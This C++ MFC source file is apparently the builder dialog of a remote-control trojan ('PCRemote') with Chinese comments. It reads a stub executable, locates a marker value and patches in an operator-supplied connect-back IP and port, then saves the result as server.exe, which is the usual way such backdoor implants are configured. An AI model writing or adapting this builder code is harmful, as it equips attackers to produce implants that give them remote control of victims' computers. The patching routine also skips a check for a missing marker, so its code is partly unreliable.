// BuildDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "PCRemote.h"
#include "BuildDlg.h"
#include "afxdialogex.h"


// CBuildDlg 对话框

IMPLEMENT_DYNAMIC(CBuildDlg, CDialogEx)

struct Connect_Address
{
	DWORD dwstact;
	char  strIP[MAX_PATH];
	int   nPort;
}g_myAddress={0x1234567,"",0};

CBuildDlg::CBuildDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CBuildDlg::IDD, pParent)
	, m_strIP(_T(""))
	, m_strPort(_T(""))
{

}

CBuildDlg::~CBuildDlg()
{
}

void CBuildDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT1, m_strIP);
	DDX_Text(pDX, IDC_EDIT2, m_strPort);
}


BEGIN_MESSAGE_MAP(CBuildDlg, CDialogEx)
	ON_BN_CLICKED(IDOK, &CBuildDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CBuildDlg 消息处理程序

int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
		if (j == da) return i;   
	}   
	return -1;   
}

void CBuildDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	CFile file;
	char strTemp[MAX_PATH];
	ZeroMemory(strTemp,MAX_PATH);
	CString strCurrentPath;
	CString strFile;
	CString strSeverFile;
	BYTE *lpBuffer=NULL;
	DWORD dwFileSize;
	UpdateData(TRUE);
	//////////上线信息//////////////////////
	strcpy(g_myAddress.strIP,m_strIP);
	g_myAddress.nPort=atoi(m_strPort);
	try
	{
		//此处得到未处理前的文件名
		GetModuleFileName(NULL,strTemp,MAX_PATH);     //得到文件名  
		strCurrentPath=strTemp;
		int nPos=strCurrentPath.ReverseFind('\\');     
		strCurrentPath=strCurrentPath.Left(nPos);
		strFile=strCurrentPath+"\\server\\Loder.exe";   //得到当前未处理文件名
		//打开文件
		file.Open(strFile,CFile::modeRead|CFile::typeBinary);
		dwFileSize=file.GetLength();
		lpBuffer=new BYTE[dwFileSize];
		ZeroMemory(lpBuffer,dwFileSize);
		//读取文件内容
		file.Read(lpBuffer,dwFileSize);
		file.Close();
		//写入上线IP和端口 主要是寻找0x1234567这个标识然后写入这个位置
		int nOffset=memfind((char*)lpBuffer,(char*)&g_myAddress.dwstact,dwFileSize,sizeof(DWORD));
		memcpy(lpBuffer+nOffset,&g_myAddress,sizeof(Connect_Address));
		//保存到文件
		strSeverFile=strCurrentPath+"\\server.exe";
		file.Open(strSeverFile,CFile::typeBinary|CFile::modeCreate|CFile::modeWrite);
		file.Write(lpBuffer,dwFileSize);
		file.Close();
		delete[] lpBuffer;
		MessageBox("生成成功");

	}
	catch (CMemoryException* e)
	{
		MessageBox("内存不足");
	}
	catch (CFileException* e)
	{
		MessageBox("文件操作错误");
	}
	catch (CException* e)
	{
		MessageBox("未知错误");
	}
	CDialogEx::OnOK();

}
